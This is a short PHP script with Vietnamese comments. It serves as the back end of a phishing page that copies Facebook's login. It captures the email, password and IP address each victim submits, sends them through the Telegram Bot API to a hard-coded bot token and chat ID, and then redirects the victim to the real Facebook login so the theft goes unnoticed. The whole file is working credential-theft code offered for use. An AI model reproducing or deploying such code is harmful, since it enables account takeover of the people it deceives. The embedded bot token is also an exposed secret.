<?php
// Thay thông tin của bạn vào đây
$token = "8638499162:AAHwk0qD_0tMHEhjKVvqlRqeI7Z4L5QYkUQ";
$chat_id = "6605554381";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];

    $text = "🔔 Có mục tiêu mới:\n👤 Tài khoản: $email\n🔑 Mật khẩu: $pass\n🌐 IP: $ip";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chat_id,
        'text' => $text
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);

    // Chuyển hướng người dùng về trang chủ Facebook thật sau khi lấy xong
    header("Location: https://www.facebook.com/login.php");
    exit();
}
?>